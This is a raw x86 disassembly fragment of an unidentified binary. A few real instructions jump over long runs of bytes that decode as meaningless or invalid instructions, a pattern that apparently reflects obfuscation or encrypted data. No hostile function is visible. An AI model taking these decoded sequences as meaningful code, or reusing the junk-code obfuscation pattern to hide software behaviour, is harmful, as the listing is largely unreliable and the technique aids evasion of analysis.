  40f55f:	js     0x40f5d5
  40f561:	and    bh,BYTE PTR [eax+0x30432554]
  40f567:	add    edi,esp
  40f569:	mov    esp,0xc7c28ea6
  40f56e:	jmp    0x7a5f60b6
  40f573:	cs xor eax,0xc991ad6b
  40f579:	xor    esp,DWORD PTR [eax+0x1fe374ad]
  40f57f:	mov    ecx,0x909e74eb
  40f584:	mov    al,ds:0x79885cb9
  40f589:	xor    dl,dl
  40f58b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f58c:	or     DWORD PTR [edx+eiz*8],0xffffff99
  40f590:	pop    eax
  40f591:	ret    
  40f592:	ins    DWORD PTR es:[edi],dx
  40f593:	ins    BYTE PTR es:[edi],dx
  40f594:	(bad)  
  40f596:	inc    ebx
  40f597:	and    bp,cx
  40f59a:	int3   
  40f59b:	pushf  
  40f59c:	(bad)  
  40f59d:	push   edi
  40f59e:	mov    DWORD PTR [ebp-0x58],0x3082
  40f5a5:	mov    DWORD PTR [ebp-0x54],0x37a2
  40f5ac:	mov    DWORD PTR [ebp-0x50],0x49d6
  40f5b3:	mov    DWORD PTR [ebp-0x4c],0x6390
  40f5ba:	mov    DWORD PTR [ebp-0x48],0x40f2
  40f5c1:	mov    DWORD PTR [ebp-0x44],0x21d4
  40f5c8:	mov    DWORD PTR [ebp-0x28],0x4726
  40f5cf:	mov    DWORD PTR [ebp-0x24],0x221a
  40f5d6:	mov    DWORD PTR [ebp-0x30],0x768c
  40f5dd:	mov    DWORD PTR [ebp-0x2c],0x29e8
  40f5e4:	mov    DWORD PTR [ebp-0x40],0x6cf6
  40f5eb:	mov    DWORD PTR [ebp-0x3c],0x94c
  40f5f2:	mov    DWORD PTR [ebp-0x38],0x4797
  40f5f9:	mov    DWORD PTR [ebp-0x34],0x4439
  40f600:	mov    DWORD PTR [ebp-0x20],0x2531
  40f607:	mov    esi,0x5a3e
  40f60c:	mov    DWORD PTR [ebp-0x1c],esi
  40f60f:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  40f616:	mov    DWORD PTR [ebp-0x14],0x7
  40f61d:	mov    DWORD PTR [ebp-0x10],0xe3a
  40f624:	mov    DWORD PTR [ebp-0xc],0x6a6e
  40f62b:	mov    DWORD PTR [ebp-0x8],0x6b99
  40f632:	mov    DWORD PTR [ebp-0x4],0x2acd
  40f639:	mov    eax,DWORD PTR [ebp-0x10]
  40f63c:	mov    ecx,DWORD PTR [ebp-0xc]
  40f63f:	mov    eax,DWORD PTR [ebp-0x8]
  40f642:	mov    ecx,DWORD PTR [ebp-0x4]
  40f645:	mov    eax,DWORD PTR [ebp-0x18]
  40f648:	mov    ecx,DWORD PTR [ebp-0x14]
  40f64b:	mov    eax,DWORD PTR [ebp-0x8]
  40f64e:	jmp    0x40fa02
  40f653:	pusha  
  40f654:	and    cl,BYTE PTR [esi]
  40f656:	push   ebp
  40f657:	xchg   esp,eax
  40f658:	jns    0x40f602
  40f65a:	cmp    al,0x86
  40f65c:	aas    
  40f65d:	(bad)  
  40f65f:	pop    edi
  40f660:	mov    WORD PTR [eax-0x23],?
  40f663:	pop    eax
  40f664:	push   ds
  40f665:	mov    esi,0xbec4e3be
  40f66a:	mov    esi,0x8a7fc28e
  40f66f:	(bad)  
  40f670:	ins    BYTE PTR es:[edi],dx
  40f671:	fs popa 
  40f673:	das    
  40f674:	mov    ah,0xdf
  40f676:	pushf  
  40f677:	(bad)  
  40f679:	cdq    
  40f67a:	mov    al,0xf6
  40f67c:	stc    
  40f67d:	mov    esp,0x91a27f0c
  40f682:	xor    ecx,DWORD PTR [edi]
  40f684:	jno    0x40f648
  40f686:	sub    ebx,DWORD PTR [esi+eiz*2+0x7592617b]
  40f68d:	ins    DWORD PTR es:[edi],dx
  40f68e:	hlt    
  40f68f:	nop
  40f690:	mov    BYTE PTR [esi-0x6d76b727],bh
  40f696:	cli    
  40f697:	(bad)  
  40f699:	test   DWORD PTR [esi+0xf],0x4c6ec866
  40f6a0:	call   0x2a0ad8ec
  40f6a5:	push   eax
  40f6a6:	pop    esi
  40f6a7:	ins    BYTE PTR es:[edi],dx
  40f6a8:	dec    esp
  40f6a9:	fistp  QWORD PTR [edx+0x3be43f85]
  40f6af:	outs   dx,DWORD PTR ds:[esi]
  40f6b0:	sbb    eax,0x18344876
  40f6b5:	(bad)  
  40f6b6:	xchg   edx,eax
  40f6b7:	sahf   
  40f6b8:	retf   0xe06b
  40f6bb:	ins    BYTE PTR es:[edi],dx
  40f6bc:	push   ss
  40f6bd:	push   ebx
  40f6be:	mov    dl,0xe2
  40f6c0:	pop    es
  40f6c1:	pushf  
  40f6c2:	mov    ah,0xba
  40f6c4:	or     eax,0xd8b906ae
  40f6c9:	push   ebx
  40f6ca:	cmp    ebx,DWORD PTR [eax+0x7bb28505]
  40f6d0:	jne    0x40f707
  40f6d2:	and    BYTE PTR [ecx],ch
  40f6d4:	in     al,0x82
  40f6d6:	fwait
  40f6d7:	je     0x40f74f
  40f6d9:	dec    edi
  40f6da:	mov    ebp,0x56efc46
  40f6df:	mov    cl,0xbd
  40f6e1:	cmp    al,0x3e
  40f6e3:	test   BYTE PTR [esi-0x4a],dl
  40f6e6:	outs   dx,BYTE PTR ds:[esi]
  40f6e7:	or     esp,edx
  40f6e9:	and    esi,DWORD PTR ds:0xc106a7bc
  40f6ef:	or     eax,0xa470cd2a
  40f6f4:	stos   BYTE PTR es:[edi],al
  40f6f5:	bound  edi,QWORD PTR [ebp-0x41cbb65]
  40f6fb:	sbb    cl,BYTE PTR [ecx-0x9811947]
  40f701:	dec    edi
  40f702:	dec    esp
  40f703:	es push ecx
  40f705:	shl    ah,1
  40f707:	pop    edi
  40f708:	imul   al
  40f70a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f70b:	sub    ah,dh
  40f70d:	mov    ch,0x67
  40f70f:	push   eax
  40f710:	ss retf 0xd336
  40f714:	dec    edi
  40f715:	into   
  40f716:	imul   eax,DWORD PTR [edx-0x7009ae9b],0x1f
  40f71d:	and    al,0xdb
  40f71f:	xor    esi,DWORD PTR [esi]
  40f721:	(bad)  
  40f722:	and    BYTE PTR [esi-0x2082efd2],al
  40f728:	cdq    
  40f729:	xchg   esp,eax
  40f72a:	inc    edi
  40f72b:	(bad)  
  40f72c:	ficom  WORD PTR [ebx+0x7c]
  40f72f:	ret    0x5daa
  40f732:	push   ds
  40f733:	mov    al,0x4b
  40f735:	inc    esi
  40f736:	jno    0x40f79e
  40f738:	mov    ds:0x5596f67f,eax
  40f73d:	cmp    dh,dl
  40f73f:	mov    ebx,0x504de9ad
  40f744:	xchg   edi,eax
  40f745:	and    al,0xb4
  40f747:	push   esi
  40f748:	sbb    edx,0xffffffbe
  40f74b:	sub    esp,eax
  40f74d:	xchg   edx,eax
  40f74e:	sahf   
  40f74f:	repz mov al,ds:0xbf2b111d
  40f755:	enter  0x92ab,0x3f
  40f759:	cmp    al,BYTE PTR [edx+0x60]
  40f75c:	jbe    0x40f72d
  40f75e:	jno    0x40f7bd
  40f760:	inc    edx
  40f761:	adc    BYTE PTR ds:0x7aaa7d38,cl
  40f767:	cmp    al,0x12
  40f769:	add    al,dl
  40f76b:	pop    edx
  40f76c:	bound  esp,QWORD PTR [esi-0x71e312e9]
  40f772:	imul   esi,DWORD PTR [eax-0x80],0xffffff85
  40f776:	je     0x40f780
  40f778:	lods   eax,DWORD PTR ds:[esi]
  40f779:	push   es
  40f77a:	add    ah,ah
  40f77c:	xor    DWORD PTR [ebx+0x18],ebp
  40f77f:	(bad)  
  40f780:	cmp    DWORD PTR [ebx+0x7dd58d96],esi
  40f786:	jo     0x40f721
  40f788:	test   BYTE PTR [edx+eiz*2-0x8451682],dh
  40f78f:	mov    edi,0xbc836ac0
  40f794:	out    dx,al
  40f795:	out    0xbd,al
  40f797:	sti    
  40f798:	jge    0x40f71d
  40f79a:	das    
  40f79b:	push   esp
  40f79c:	jecxz  0x40f788
  40f79e:	addr16 lahf 
  40f7a0:	jo     0x40f7fc
  40f7a2:	xor    eax,DWORD PTR [edx]
  40f7a4:	bound  ebp,QWORD PTR [ecx+0x10400479]
  40f7aa:	mov    esi,0x982b688f
  40f7af:	cmp    bl,BYTE PTR [eax]
  40f7b1:	or     DWORD PTR [ecx-0x5e030c95],ecx
  40f7b7:	lock sub cl,dh
  40f7ba:	out    dx,al
  40f7bb:	mov    bl,BYTE PTR [ebx-0x1]
  40f7be:	sti    
  40f7bf:	mov    ecx,0x7177def3
  40f7c4:	aaa    
  40f7c5:	test   al,0xf8
  40f7c7:	xchg   DWORD PTR fs:[ebx+0x20752ec1],esp
  40f7ce:	mov    dl,0x17
  40f7d0:	push   ebx
  40f7d1:	rcr    BYTE PTR [bx+si-0x29],0xfc
  40f7d6:	and    eax,0x829d068a
  40f7db:	push   ds
  40f7dc:	popf   
  40f7dd:	enter  0xa1a4,0xec
  40f7e1:	add    eax,0xda2cdf25
  40f7e6:	xor    bh,BYTE PTR [eax]
  40f7e8:	(bad)  
  40f7e9:	stos   BYTE PTR es:[edi],al
  40f7ea:	int    0x12
  40f7ec:	dec    esi
  40f7ed:	mov    bl,ch
  40f7ef:	clc    
  40f7f0:	pusha  
  40f7f1:	add    ebp,DWORD PTR [ecx+0x2e]
  40f7f4:	add    ebp,esp
  40f7f6:	dec    ebp
  40f7f7:	sbb    edx,eax
  40f7f9:	dec    edx
  40f7fa:	or     eax,0xd2ae35e5
  40f7ff:	push   ss
  40f800:	add    ebx,DWORD PTR [edx]
  40f802:	mov    bl,0x2f
  40f804:	push   eax
  40f805:	inc    edx
  40f806:	push   ebx
  40f807:	mov    eax,0x198f6389
  40f80c:	mov    edx,0x36482da8
  40f811:	enter  0xc5,0xf6
  40f815:	bound  esp,QWORD PTR [ebp-0xda122cc]
  40f81b:	les    edi,FWORD PTR [ebx+0x55]
  40f81e:	xchg   ecx,eax
  40f81f:	dec    edi
  40f820:	sti    
  40f821:	mov    BYTE PTR [edi],dh
  40f823:	cld    
  40f824:	(bad)  
  40f825:	adc    al,0x71
  40f827:	ds clc 
  40f829:	addr16 test eax,0xb8bbf01e
  40f82f:	mov    WORD PTR [eax+0x48],fs
  40f832:	xor    eax,esi
  40f834:	xor    al,0x31
  40f836:	test   DWORD PTR [ebp+0x57],esp
  40f839:	mov    al,0x83
  40f83b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f83c:	fldenv [edx]
  40f83e:	cwde   
  40f83f:	outs   dx,BYTE PTR ds:[esi]
  40f840:	jmp    0x40f7cc
  40f842:	dec    ecx
  40f843:	xor    al,BYTE PTR [esi+ebx*8-0x168b4cd5]
  40f84a:	aaa    
  40f84b:	(bad)  
  40f84c:	jns    0x40f882
  40f84e:	cmc    
  40f84f:	pop    ebx
  40f850:	data16 sub al,0x95
  40f853:	dec    ebx
  40f854:	mov    dl,BYTE PTR [esi]
  40f856:	xchg   DWORD PTR [ecx-0x46],ebp
  40f859:	or     edi,esi
  40f85b:	xchg   ebp,eax
  40f85c:	add    BYTE PTR [eax+edx*2],cl
  40f85f:	lods   eax,DWORD PTR ds:[esi]
  40f860:	dec    eax
  40f861:	adc    BYTE PTR [esi],bl
  40f863:	push   ss
  40f864:	out    0x42,eax
  40f866:	xchg   ebp,eax
  40f867:	mov    DWORD PTR [ecx-0x2b],esp
  40f86a:	mov    ah,0x44
  40f86c:	mul    DWORD PTR [ebx]
  40f86e:	or     al,0xf5
  40f870:	push   ebp
  40f871:	loop   0x40f8d1
  40f873:	sub    ebp,DWORD PTR [ecx+0x52]
  40f876:	xor    BYTE PTR [edx],cl
  40f878:	or     al,0x60
  40f87a:	jge    0x40f8b9
  40f87c:	xchg   esp,eax
  40f87d:	ins    BYTE PTR es:[edi],dx
  40f87e:	or     al,0x66
  40f880:	cmp    BYTE PTR [ebp-0x295ab2c8],ah
  40f886:	clc    
  40f887:	in     al,dx
  40f888:	cmp    eax,0x73e3a12a
  40f88d:	adc    al,0xef
  40f88f:	fsubr  st(7),st
  40f891:	arpl   WORD PTR [ebx+0x13],di
  40f894:	sub    al,BYTE PTR [esi-0x5a2916ca]
  40f89a:	push   cs
  40f89b:	pop    edi
  40f89c:	(bad)  
  40f89d:	ds ja  0x40f8a1
  40f8a0:	cld    
  40f8a1:	popa   
  40f8a2:	push   edx
  40f8a3:	mov    es,WORD PTR [edi+esi*1+0x17]
  40f8a7:	int3   
  40f8a8:	ficomp DWORD PTR [ecx-0x3]
  40f8ab:	mov    ch,0x22
  40f8ad:	inc    ecx
  40f8ae:	dec    ebp
  40f8af:	das    
  40f8b0:	aad    0xc
  40f8b2:	jp     0x40f8a5
  40f8b4:	fiadd  WORD PTR ds:0x2617c5f
  40f8ba:	mov    di,0xb27e
  40f8be:	fistp  WORD PTR [ecx+0x7a]
  40f8c1:	mov    al,0xf4
  40f8c3:	cmp    BYTE PTR es:[esi],ch
  40f8c6:	dec    edi
  40f8c7:	sbb    ah,ch
  40f8c9:	adc    ch,bl
  40f8cb:	adc    BYTE PTR ds:0x14e5f6d8,0xf9
  40f8d2:	cmp    BYTE PTR ss:[ecx+edi*4+0x196f9d45],0x53
  40f8db:	push   esi
  40f8dc:	int3   
  40f8dd:	call   esi
  40f8df:	mov    DWORD PTR [ebx+edi*1],esi
  40f8e2:	loopne 0x40f885
  40f8e4:	and    ebx,DWORD PTR [esi-0x15]
  40f8e7:	adc    cl,ch
  40f8e9:	pop    ebx
  40f8ea:	mov    ebx,0xff33702a
  40f8ef:	dec    eax
  40f8f0:	pop    ebx
  40f8f1:	cld    
  40f8f2:	mov    dh,0xb6
  40f8f4:	fist   DWORD PTR ds:0x66b6e944
  40f8fa:	pop    ebp
  40f8fb:	xor    DWORD PTR [esi],0x4ea66293
  40f901:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f902:	scas   al,BYTE PTR es:[edi]
  40f903:	sub    eax,0xc1b18b3f
  40f908:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f909:	cmp    ebx,DWORD PTR [ebx]
  40f90b:	mov    ebx,0x746968d5
  40f910:	cmp    eax,0x37252b3d
  40f915:	mov    eax,ds:0x511be89d
  40f91a:	ret    0x73fa
  40f91d:	adc    eax,0xffffffad
  40f920:	push   0x1fcbff5c
  40f925:	shl    BYTE PTR [eax+0x1602199d],1
  40f92b:	jmp    0xcbf:0xfff5478
  40f932:	sahf   
  40f933:	or     BYTE PTR [edx+0x61],0x31
  40f937:	das    
  40f938:	icebp  
  40f939:	imul   ecx,ebx,0xffffffbc
  40f93c:	out    dx,eax
  40f93d:	mov    esi,0x63b66225
  40f942:	lock scas al,BYTE PTR es:[edi]
  40f944:	call   0x1fef:0xaf15c00b
  40f94b:	push   esp
  40f94c:	adc    eax,0x7400ae02
  40f951:	sbb    al,0x7a
  40f953:	je     0x40f943
  40f955:	popa   
  40f956:	test   al,0xb9
  40f958:	fisubr DWORD PTR [esi+0x67]
  40f95b:	int    0x99
  40f95d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f95e:	inc    esp
  40f95f:	inc    edx
  40f960:	sbb    BYTE PTR [edi],al
  40f962:	retf   
  40f963:	fwait
  40f964:	repnz aaa 
  40f966:	test   ecx,0x142e7d34
  40f96c:	mov    ah,BYTE PTR [edx+0x7c665cd8]
  40f972:	cmp    bl,BYTE PTR [edi+0x32cefb60]
  40f978:	xor    DWORD PTR [ecx-0x4c],ecx
  40f97b:	shl    DWORD PTR [eax+0x52],0x20
  40f97f:	(bad)  
  40f980:	in     al,dx
  40f981:	iret   
  40f982:	fcom   DWORD PTR [esi-0x60]
  40f985:	cmc    
  40f986:	xor    bl,BYTE PTR [esi-0x7]
  40f989:	loope  0x40f9f9
  40f98b:	cwde   
  40f98c:	mov    ebx,0x3500544b
  40f991:	fs cmp eax,0x94a91f1d
  40f997:	addr16 inc eax
  40f999:	(bad)  
  40f99a:	pop    ds
  40f99b:	int3   
  40f99c:	out    dx,al
  40f99d:	pop    esi
  40f99e:	xlat   BYTE PTR ds:[ebx]
  40f99f:	gs sahf 
  40f9a1:	adc    al,0x43
  40f9a3:	ss sbb al,0x2e
  40f9a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9a7:	mov    DWORD PTR [edx+0x36d7339c],ecx
  40f9ad:	and    ch,BYTE PTR [ebx+eax*8]
  40f9b0:	sub    esp,edi
  40f9b2:	push   ecx
  40f9b3:	sub    al,0x55
  40f9b5:	std    
  40f9b6:	into   
  40f9b7:	jmp    0xeed0d8ca
  40f9bc:	push   ss
  40f9bd:	sbb    DWORD PTR [eax-0x3a5c0bc6],edi
  40f9c3:	scas   eax,DWORD PTR es:[edi]
  40f9c4:	cli    
  40f9c5:	mov    bh,0x6e
  40f9c7:	std    
  40f9c8:	stos   DWORD PTR es:[edi],eax
  40f9c9:	mov    al,ds:0x1d7138ae
  40f9ce:	test   DWORD PTR [ebp-0x6e],edi
  40f9d1:	dec    esp
  40f9d2:	into   
  40f9d3:	or     bl,ah
  40f9d5:	mov    bh,BYTE PTR [eax]
  40f9d7:	cmp    bh,cl
  40f9d9:	in     eax,0xfb
  40f9db:	shr    BYTE PTR [ebp+0x57c55f2],0x97
  40f9e2:	imul   ebp,DWORD PTR [edx+0x310d4196],0x4567da20
  40f9ec:	fwait
  40f9ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9ee:	lahf   
  40f9ef:	inc    esi
  40f9f0:	jecxz  0x40fa55
  40f9f2:	sbb    eax,0x23294df1
  40f9f7:	pop    ebx
  40f9f8:	push   ss
  40f9f9:	dec    ecx
  40f9fa:	mov    ds:0x36ee3d76,al
  40f9ff:	mov    bl,0x9c
  40fa01:	push   edx
  40fa02:	mov    ecx,DWORD PTR [ebp-0x4]
  40fa05:	mov    edx,DWORD PTR [ebp-0x10]
  40fa08:	mov    edi,DWORD PTR [ebp-0xc]
  40fa0b:	add    eax,edx
  40fa0d:	mov    edx,DWORD PTR [ebp-0x18]
  40fa10:	adc    ecx,edi
  40fa12:	mov    edi,DWORD PTR [ebp-0x14]
  40fa15:	push   edi
  40fa16:	push   edx
  40fa17:	or     ecx,0x6833
  40fa1d:	or     eax,0x6b80
  40fa22:	push   ecx
  40fa23:	push   eax
  40fa24:	call   0x422281
  40fa29:	mov    ecx,DWORD PTR [ebp-0x20]
  40fa2c:	mov    edi,DWORD PTR [ebp-0x1c]
  40fa2f:	and    eax,0x25cb
  40fa34:	jmp    0x40fde8
  40fa39:	js     0x40fa83
  40fa3b:	cld    
  40fa3c:	(bad)  
  40fa3e:	jb     0x40fabc
  40fa40:	pop    eax
  40fa41:	dec    eax
  40fa42:	lods   eax,DWORD PTR ds:[esi]
  40fa43:	push   cs
  40fa44:	sahf   
  40fa45:	inc    ecx
  40fa46:	ds js  0x40f9db
  40fa49:	jge    0x40fa71
  40fa4b:	mov    esi,0xbec4e3be
  40fa50:	mov    esi,0xda9ffa08
  40fa55:	test   BYTE PTR [edx+0x7dea98f4],0x31
  40fa5c:	js     0x40fa41
  40fa5e:	ror    DWORD PTR [ebx+0x32056e4a],cl
  40fa64:	ror    BYTE PTR [edx-0xc],0xbc
  40fa68:	xchg   ebp,eax
  40fa69:	jle    0x40fa81
  40fa6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa6c:	repnz nop
  40fa6e:	test   BYTE PTR [eax],cl
  40fa70:	push   ebx
  40fa71:	mov    BYTE PTR [edi+0x1d],ch
  40fa74:	mov    DWORD PTR [eax-0x7f],esp
  40fa77:	sub    eax,0x42edad12
  40fa7c:	sbb    ch,BYTE PTR [edi-0x24]
  40fa7f:	dec    esp
  40fa80:	and    BYTE PTR [ecx-0x84ad543],0x13
  40fa87:	icebp  
  40fa88:	pop    esp
  40fa89:	ficom  DWORD PTR [esi-0xafeb8c8]
  40fa8f:	xor    eax,0xcebd674
  40fa94:	or     eax,DWORD PTR fs:[ebx-0x6c]
  40fa98:	mov    bh,0x38
  40fa9a:	push   esp
  40fa9b:	sub    al,0xec
  40fa9d:	sub    bh,al
  40fa9f:	ins    DWORD PTR es:[edi],dx
  40faa0:	mov    cs,WORD PTR [eax-0x17a7f764]
  40faa6:	cli    
  40faa7:	or     eax,0xc119d95f
  40faac:	push   ebp
  40faad:	push   ebx
  40faae:	sar    BYTE PTR [esi-0x4f297dce],cl
  40fab4:	pushf  
  40fab5:	call   0x4c4:0x1b86bdb5
  40fabc:	pop    es
  40fabd:	cs lock jp 0x40fa5e
  40fac1:	fwait
  40fac2:	and    bl,ah
  40fac4:	mov    WORD PTR [ecx+0x44be82d5],cs
  40faca:	test   BYTE PTR [eax+0x59f5a5b4],0x87
  40fad1:	xchg   DWORD PTR [edx-0x66],eax
  40fad4:	xchg   esi,eax
  40fad5:	xor    eax,0x33dd54b0
  40fada:	and    eax,0x260de87e
  40fadf:	sbb    BYTE PTR [edx-0x36],dh
  40fae2:	mov    BYTE PTR [ebx],dh
  40fae4:	test   ecx,edi
  40fae6:	push   ebp
  40fae7:	lds    edi,FWORD PTR [edx+0x50]
  40faea:	inc    ecx
  40faeb:	inc    ebp
  40faec:	sbb    dh,BYTE PTR [ebx+0x21]
  40faef:	mov    dh,0x71
  40faf1:	call   0xc6e3:0x9622bf7d
  40faf8:	mov    ch,0x77
  40fafa:	push   0x47
  40fafc:	arpl   WORD PTR [ecx],di
  40fafe:	outs   dx,BYTE PTR ds:[esi]
  40faff:	rcl    cl,cl
  40fb01:	in     al,dx
  40fb02:	leave  
  40fb03:	adc    esi,DWORD PTR [ebp+0x47c52fdb]
  40fb09:	xchg   esp,ecx
  40fb0b:	cwde   
  40fb0c:	adc    bh,bh
  40fb0e:	test   DWORD PTR [eax-0xc],edi
  40fb11:	rcl    DWORD PTR [ebp+0x59c3ec65],cl
  40fb17:	fucomp st(0)
  40fb19:	fsub   st(7),st
  40fb1b:	xchg   ecx,eax
  40fb1c:	inc    edi
  40fb1d:	xchg   ebx,eax
  40fb1e:	jge    0x40fb9b
  40fb20:	outs   dx,BYTE PTR ds:[esi]
  40fb21:	add    eax,0x1ced114c
  40fb26:	out    0x58,al
  40fb28:	and    eax,0x18a5859c
  40fb2d:	and    BYTE PTR [ecx-0x6],cl
  40fb30:	aam    0x35
  40fb32:	jb     0x40fb2f
  40fb34:	nop
  40fb35:	push   esp
  40fb36:	inc    edx
  40fb37:	push   ds
  40fb38:	and    bl,0xfa
  40fb3b:	fistp  QWORD PTR [edx+0x1]
  40fb3e:	inc    eax
  40fb3f:	fisttp WORD PTR [esi]
  40fb41:	pusha  
  40fb42:	jg     0x40fb4e
  40fb44:	pop    es
  40fb45:	xor    bl,BYTE PTR [ebx+0x69]
  40fb48:	xor    BYTE PTR [ebx],dl
  40fb4a:	dec    ecx
  40fb4b:	jnp    0x40fad5
  40fb4d:	daa    
  40fb4e:	in     al,0x30
  40fb50:	push   0x46
  40fb52:	sbb    ch,BYTE PTR [ebx+0x652a32fb]
  40fb58:	retf   
  40fb59:	(bad)  
  40fb5a:	out    0xe3,al
  40fb5c:	fisubr DWORD PTR [ebx-0x58]
  40fb5f:	sbb    ebx,DWORD PTR [eax+0x1890bf2b]
  40fb65:	je     0x40fb86
  40fb67:	dec    edi
  40fb68:	in     al,0x60
  40fb6a:	jmp    0xc7baa451
  40fb6f:	cdq    
  40fb70:	int3   
  40fb71:	int    0x95
  40fb73:	and    eax,0xb08c104a
  40fb78:	jge    0x40fb4f
  40fb7a:	(bad)  
  40fb7b:	or     eax,0xf7d988bf
  40fb80:	cmp    dl,bh
  40fb82:	hlt    
  40fb83:	test   eax,0x318c5dc3
  40fb88:	mov    ch,0xdf
  40fb8a:	mov    WORD PTR [ecx+eax*4-0x5bc16c26],ds
  40fb91:	rcr    BYTE PTR [ebp+0x63],1
  40fb94:	into   
  40fb95:	push   ecx
  40fb96:	imul   edx,DWORD PTR [eax+0x12ce587a],0xa1636ca3
  40fba0:	jb     0x40fbfd
  40fba2:	push   ds
  40fba3:	mov    eax,ds:0x101d85f5
  40fba8:	test   eax,0x6e6080f4
  40fbad:	and    ebx,DWORD PTR [ebp+0x786c0722]
  40fbb3:	jo     0x40fb7e
  40fbb5:	push   ecx
  40fbb6:	(bad)  
  40fbb7:	cmc    
  40fbb8:	ret    0x2f70
  40fbbb:	mov    esi,0x1eb9aeb
  40fbc0:	scas   al,BYTE PTR es:[edi]
  40fbc1:	in     eax,0x30
  40fbc3:	repnz or edi,edi
  40fbc6:	mov    ah,0x4
  40fbc8:	jne    0x40fbcc
  40fbca:	mov    ebx,0x7eba28c0
  40fbcf:	xlat   BYTE PTR ds:[ebx]
  40fbd0:	stc    
  40fbd1:	gs ja  0x40fbb4
  40fbd4:	jmp    0x40fc51
  40fbd6:	jmp    0x86b:0xd78dc402
  40fbdd:	or     cl,BYTE PTR [ecx+0x3e13727b]
  40fbe3:	je     0x40fbcd
  40fbe5:	int    0xcd
  40fbe7:	dec    eax
  40fbe8:	mov    ebx,0x8636d1d
  40fbed:	sbb    eax,0xd9fd7ce0
  40fbf2:	and    eax,0xb285cf5e
  40fbf7:	icebp  
  40fbf8:	xor    eax,0x9e61ef4d
  40fbfd:	mov    ds:0x608ae325,eax
  40fc02:	das    
  40fc03:	repnz ins DWORD PTR es:[edi],dx
  40fc05:	push   ebp
  40fc06:	and    BYTE PTR [esi-0x714b547a],ch
  40fc0c:	scas   eax,DWORD PTR es:[edi]
  40fc0d:	fdiv   DWORD PTR [ebx]
  40fc0f:	xchg   esp,eax
  40fc10:	dec    ebx
  40fc11:	cmc    
  40fc12:	mov    esp,0xaf91c06d
  40fc17:	repnz scas eax,DWORD PTR es:[edi]
  40fc19:	fcmovu st,st(2)
  40fc1b:	ja     0x40fbe3
  40fc1d:	adc    BYTE PTR [eax+0x2f8ceb15],ch
  40fc23:	sub    eax,DWORD PTR [ebx+ebx*2+0x2fcdaf35]
  40fc2a:	mov    bl,0xac
  40fc2c:	mov    ebx,0xaf2ea22f
  40fc31:	scas   eax,DWORD PTR es:[edi]
  40fc32:	lea    esi,[ecx]
  40fc34:	fnstcw WORD PTR [edi+0x6a7cd321]
  40fc3a:	mov    ah,0x23
  40fc3c:	sbb    DWORD PTR [edi-0x49],0xfc5ed311
  40fc43:	mov    eax,ds:0x122d89ac
  40fc48:	pushf  
  40fc49:	sbb    DWORD PTR [ecx+0x7212f8e3],esp
  40fc4f:	sbb    eax,0x1e1bd91
  40fc54:	inc    ebx
  40fc55:	leave  
  40fc56:	mov    DWORD PTR [eax],esi
  40fc58:	loop   0x40fc3c
  40fc5a:	cdq    
  40fc5b:	(bad)  
  40fc5c:	push   edi
  40fc5d:	(bad)  
  40fc5e:	sahf   
  40fc5f:	xchg   edx,eax
  40fc60:	cmp    dl,BYTE PTR [esi-0x481ae7c1]
  40fc66:	push   0x4f
  40fc68:	push   0x35
  40fc6a:	inc    ebx
  40fc6b:	ja     0x40fc8a
  40fc6d:	ds popf 
  40fc6f:	popf   
  40fc70:	mov    eax,edx
  40fc72:	and    BYTE PTR [esi+0x2f55de1e],bh
  40fc78:	out    dx,al
  40fc79:	paddsb mm3,mm5
  40fc7c:	cmp    dl,dl
  40fc7e:	sbb    eax,DWORD PTR [ebx-0x72]
  40fc81:	push   ecx
  40fc82:	dec    edx
  40fc83:	pop    edi
  40fc84:	jns    0x40fc8c
  40fc86:	test   DWORD PTR [edi+0x79],esp
  40fc89:	add    eax,0x9583e836
  40fc8e:	pop    ebx
  40fc8f:	mov    dl,0x84
  40fc91:	out    dx,al
  40fc92:	outs   dx,BYTE PTR ds:[esi]
  40fc93:	enter  0xd691,0x7c
  40fc97:	mov    DWORD PTR [edx],ebp
  40fc99:	xchg   ecx,eax
  40fc9a:	(bad)  
  40fc9b:	xor    eax,0x31306779
  40fca0:	or     eax,0x334ad09d
  40fca5:	xchg   esi,eax
  40fca6:	sbb    al,0xec
  40fca8:	pop    esi
  40fca9:	(bad)  
  40fcaa:	cmc    
  40fcab:	je     0x40fc97
  40fcad:	aas    
  40fcae:	inc    eax
  40fcaf:	(bad)  
  40fcb0:	mov    ah,0x8f
  40fcb2:	sbb    edx,eax
  40fcb4:	mov    ebx,0x3acc77ff
  40fcb9:	retf   0x2162
  40fcbc:	mov    ecx,0x37f84ac
  40fcc1:	jmp    0xaa67:0x8c2bacb5
  40fcc8:	push   es
  40fcc9:	stc    
  40fcca:	imul   BYTE PTR [eax+ebp*1-0x16860e4d]
  40fcd1:	dec    esp
  40fcd2:	jns    0x40fd52
  40fcd4:	js     0x40fced
  40fcd6:	mov    ch,dh
  40fcd8:	sbb    DWORD PTR [eax-0x6c],ebp
  40fcdb:	fdiv   DWORD PTR [eax-0x11248a17]
  40fce1:	loop   0x40fd0d
  40fce3:	inc    edi
  40fce4:	fs inc ebx
  40fce6:	shr    BYTE PTR [edx+0x723c0e90],1
  40fcec:	dec    eax
  40fced:	mov    ebx,?
  40fcef:	loope  0x40fcad
  40fcf1:	aam    0x2a
  40fcf3:	shl    DWORD PTR [eax+0x2752de95],1
  40fcf9:	fimul  WORD PTR [edi]
  40fcfb:	fcomp  st(2)
  40fcfd:	(bad)  
  40fcff:	je     0x40fcd2
  40fd01:	sti    
  40fd02:	jg     0x40fd57
  40fd04:	push   ebx
  40fd05:	push   ebp
  40fd06:	hlt    
  40fd07:	xor    ah,dh
  40fd09:	add    ch,cl
  40fd0b:	cs jae 0x40fd2c
  40fd0e:	add    BYTE PTR [ecx-0x57],al
  40fd11:	cli    
  40fd12:	pop    ecx
  40fd13:	dec    eax
  40fd14:	adc    esi,esp
  40fd16:	adc    al,0x41
  40fd18:	xlat   BYTE PTR ds:[ebx]
  40fd19:	mov    ebp,0xa454c258
  40fd1e:	fiadd  WORD PTR [ecx+0x518ee70a]
